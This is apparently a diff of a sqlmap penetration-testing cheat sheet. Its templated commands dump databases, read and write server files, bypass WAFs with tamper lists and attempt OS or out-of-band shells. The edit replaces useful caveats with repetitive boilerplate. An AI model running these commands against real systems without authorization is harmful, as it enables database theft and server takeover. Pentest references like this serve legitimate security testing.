@@ -10,9 +10,9 @@ var sqlmap_shell_templates = printf '%s\n' '--os-pwn # Prompt for an OOB shell, 
 
 ### Scan from request.txt
 
-Run sqlmap against a captured Burp/ZAP request file. Easiest way to keep auth headers and POST bodies intact.
+Scan Sqlmap from request.txt.
 
-```sh title:"sqlmap against captured request, preserves auth headers"
+```sh title:"Sqlmap Scan from Request.txt"
 sqlmap -r $file $sqlmap_templates --batch
 ```
 <!-- cheat
@@ -22,9 +22,9 @@ import files
 
 ### Check DB privileges
 
-Check the DB user's privileges. Run before attempting --os-shell or --file-read.
+Check DB privileges with Sqlmap.
 
-```sh title:"Check DB user privileges (gate for shell/file-read)"
+```sh title:"Sqlmap Check DB Privileges"
 sqlmap -r $file $sqlmap_templates --batch --privileges
 ```
 <!-- cheat
@@ -34,9 +34,9 @@ import files
 
 ### List databases
 
-Enumerate databases on the backend. Step 1 of data extraction.
+List databases with Sqlmap.
 
-```sh title:"Enumerate databases on the backend"
+```sh title:"Sqlmap List Databases"
 sqlmap -r $file $sqlmap_templates --batch --dbs
 ```
 <!-- cheat
@@ -46,9 +46,9 @@ import files
 
 ### List tables
 
-Enumerate tables in a specific database.
+List tables with Sqlmap.
 
-```sh title:"Enumerate tables in named database"
+```sh title:"Sqlmap List Tables"
 sqlmap -r $file $sqlmap_templates --batch -D $db --tables
 ```
 <!-- cheat
@@ -59,9 +59,9 @@ var db
 
 ### List columns
 
-Enumerate columns in a specific table.
+List columns with Sqlmap.
 
-```sh title:"Enumerate columns in named table"
+```sh title:"Sqlmap List Columns"
 sqlmap -r $file $sqlmap_templates --batch -D $db -T $table --columns
 ```
 <!-- cheat
@@ -73,9 +73,9 @@ var table
 
 ### GET URL scan
 
-Run sqlmap against a URL directly.
+Get URL scan with Sqlmap.
 
-```sh title:"sqlmap direct GET URL scan"
+```sh title:"Sqlmap Get URL Scan"
 sqlmap -u "$url" $sqlmap_templates --batch
 ```
 <!-- cheat
@@ -85,9 +85,9 @@ var url
 
 ### POST data scan
 
-Run sqlmap against a URL with POST data.
+Scan POST data scan with Sqlmap.
 
-```sh title:"sqlmap direct POST data scan"
+```sh title:"Sqlmap Scan POST Data Scan"
 sqlmap -u "$url" --data="$params" $sqlmap_templates --batch
 ```
 <!-- cheat
@@ -98,9 +98,9 @@ var params
 
 ### Cookie scan
 
-Run sqlmap with a supplied Cookie header.
+Scan cookie scan with Sqlmap.
 
-```sh title:"sqlmap direct URL scan with cookie"
+```sh title:"Sqlmap Scan Cookie Scan"
 sqlmap -u "$url" --cookie="$cookie" $sqlmap_templates --batch
 ```
 <!-- cheat
@@ -113,9 +113,9 @@ var cookie
 
 ### Dump one table
 
-Dump a single named table. Faster than --dump on full DBs and easier to review.
+Dump one table with Sqlmap.
 
-```sh title:"Dump one named table, faster than full DB dump"
+```sh title:"Sqlmap Dump One Table"
 sqlmap -r $file $sqlmap_templates --batch -D $db -T $table --dump
 ```
 <!-- cheat
@@ -127,9 +127,9 @@ var table
 
 ### Dump columns
 
-Dump specific columns from a table.
+Dump columns with Sqlmap.
 
-```sh title:"Dump selected columns from table"
+```sh title:"Sqlmap Dump Columns"
 sqlmap -r $file $sqlmap_templates --batch -D $db -T $table -C "$columns" --dump
 ```
 <!-- cheat
@@ -142,9 +142,9 @@ var columns
 
 ### Dump entire DB
 
-Dump every table in the named database. Watch size.
+Dump entire DB with Sqlmap.
 
-```sh title:"Dump every table in database (watch size)"
+```sh title:"Sqlmap Dump Entire DB"
 sqlmap -r $file $sqlmap_templates --batch -D $db --dump
 ```
 <!-- cheat
@@ -155,9 +155,9 @@ var db
 
 ### Read file from server
 
-Read a file from the database server filesystem via SQL primitives. Check --privileges first; FILE/READ rights required.
+Read file from server with Sqlmap.
 
-```sh title:"Read file via SQL primitives, needs FILE rights"
+```sh title:"Sqlmap Read File from Server"
 sqlmap -r req.txt --batch $sqlmap_templates --file-read=$file_path
 ```
 <!-- cheat
@@ -167,9 +167,9 @@ var file_path
 
 ### Write file to server
 
-Write a local file to the database server filesystem. Check privileges first.
+Write file to server with Sqlmap.
 
-```sh title:"Write file via SQL primitives, needs FILE rights"
+```sh title:"Sqlmap Write File to Server"
 sqlmap -r $file --batch $sqlmap_templates --file-write="$local_file" --file-dest="$remote_path"
 ```
 <!-- cheat
@@ -183,9 +183,9 @@ var remote_path
 
 ### Generic tamper list
 
-Run with a broad generic tamper list.
+List generic tamper list with Sqlmap.
 
-```sh title:"Run with broad generic tamper list"
+```sh title:"Sqlmap List Generic Tamper List"
 sqlmap -u "$url" $sqlmap_templates --batch --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 ```
 <!-- cheat
@@ -195,9 +195,9 @@ var url
 
 ### MySQL tamper list
 
-Run with a MySQL-focused tamper list.
+List MySQL tamper list with Sqlmap.
 
-```sh title:"Run with MySQL-focused tamper list"
+```sh title:"Sqlmap List MySQL Tamper List"
 sqlmap -u "$url" $sqlmap_templates --batch --dbms=MYSQL --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
 ```
 <!-- cheat
@@ -207,9 +207,9 @@ var url
 
 ### MSSQL tamper list
 
-Run with an MSSQL-focused tamper list.
+List MSSQL tamper list with Sqlmap.
 
-```sh title:"Run with MSSQL-focused tamper list"
+```sh title:"Sqlmap List MSSQL Tamper List"
 sqlmap -u "$url" $sqlmap_templates --batch --dbms=MSSQL --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
 ```
 <!-- cheat
@@ -221,9 +221,9 @@ var url
 
 ### Get shell
 
-Try to land an OS shell or OOB shell via the SQL service account. Loud and only works on permissive DB users.
+Get shell with Sqlmap.
 
-```sh title:"Land OS / OOB shell via SQL service account"
+```sh title:"Sqlmap Get Shell"
 sqlmap -r $file $sqlmap_templates --batch $sqlmap_shell_templates 
 ```
 <!-- cheat
